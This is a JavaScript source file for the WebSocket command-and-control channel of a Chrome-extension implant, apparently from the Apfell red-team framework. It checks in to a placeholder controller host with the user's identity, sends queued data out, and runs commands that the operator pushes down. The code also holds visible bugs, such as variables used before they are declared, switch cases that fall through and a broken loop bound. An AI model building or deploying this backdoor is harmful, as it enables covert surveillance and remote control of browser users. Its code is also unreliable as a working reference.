//------------- Chrome Extension Websocket C2 mechanisms ---------------------------------
// Dictionary that holds outbound messages
let out = [];
let screencaptures = [];
class customC2 extends baseC2{
    constructor(host, port, endpoint, ssl , interval){
        super(host, port, endpoint, ssl, interval);
        this.host = host;
        this.port = port;
        this.endpoint = endpoint;
        this.interval = interval;
        this.commands = {};

        if (ssl === true){
            this.proto = 'wss://';
        } else {
            this.proto = 'ws://';
        }

        this.server = `${this.proto}${this.host}:${this.port}/${this.endpoint}`;
    }

    getConfig() {
        return JSON.stringify({'server': this.server, 'interval':this.interval, 'commands': JSON.stringify(this.commands)});
    }

    checkIn() {
        const msg = {
            "action":"checkin",
            "os":"chrome",
            "user":apfell.userinfo,
            "uuid":apfell.uuid,
            "pid":0,
            "ip":'127.0.0.1',
        };

        const meta = {
            "client": true,
            "data": btoa(unescape(encodeURIComponent(JSON.stringify(msg)))),
            "tag":"",
        };

        const encmsg = JSON.stringify(meta);
        connection.send(encmsg);
        console.log('Sent initial checkin');
    }

    postResponse(){
        if (out.length > 0){
            // Pop and send a message to the controller
            const msg = out.shift();
            const meta = {
                "client":true,
                "data": msg,
                "tag": "",
                "file":{},
            };
            connection.send(meta);
        }
    }
}


/// Create a Callback Checkin Message
function CreateCallbackCheckInMessage(username, uuid, pid, addresses, hostname) {
    let msg = {};
    msg.user = username;
    msg.pid = pid;
    msg.uuid = uuid;
    msg.ip = addresses;
    msg.host = hostname;

    return msg;
}

function CreateApfellMessage(type, apfellID, uuid, size, taskid, tasktype, data) {
    const msg = {};
    msg.type = type;
    msg.id = apfellID;
    msg.uuid = uuid;
    msg.size = size;
    msg.taskid = taskid;
    msg.tasktype = tasktype;
    msg.data =  data;

    return msg;
}

//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
const C2 = new customC2('HOST_REPLACE',  PORT_REPLACE, 'ENDPOINT_REPLACE', SSL_REPLACE, INTERVAL_REPLACE);
const connection  = new WebSocket(`${C2.server}`);

setInterval(function(){
    C2.postResponse();
}, C2.interval);

chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
    // Listen for events from other scripts
    switch (message.type) {
        
        case 'screencapture': {
            // TODO: Chunk screencapture and send
        }
    }
});

connection.onopen = function () {
    C2.checkIn();
};

connection.onclose = function () {
    // Do Nothing
};

connection.onerror = function () {
    // Do Nothing
};

connection.onmessage = function (e) {
    const rawmsg = atob(e.data)
    var messagenouuid = rawmsg.slice(35, message.length - 1)
    var message = JSON.parse(messagenouuid)
    switch (message['action']) {
        case 'checkin': {
            // callback check in
            apfell.apfellid = message['id'];
            break;
        }
        case 'get_tasking' : {
            // handle an apfell message

            for (let index = 0; index < message['tasks'].length; index++) { 
                const task = message['tasks'][index];

                try {
                    C2.commands[task['command']](task['parameters'])
                } catch (error) {
                    console.log("Error executing task: " + err);
                }
            }
        }
        case 'post_response' : {
            for (let index = 0; index < message['responses']; index++) {
                const response = message['responses'][index]; 
                
                // check for screencaptures 
                if (screencaptures.length > 0) {
                    for (let index = 0; index < screencaptures.length; index++) {
                        var equal = response['task_id'].localeCompare(screencaptures[index])
                        if (equal == 0) {
                            // TODO: chunk the screencapture data
                        }
                    }
                }
            }
        }
    }
};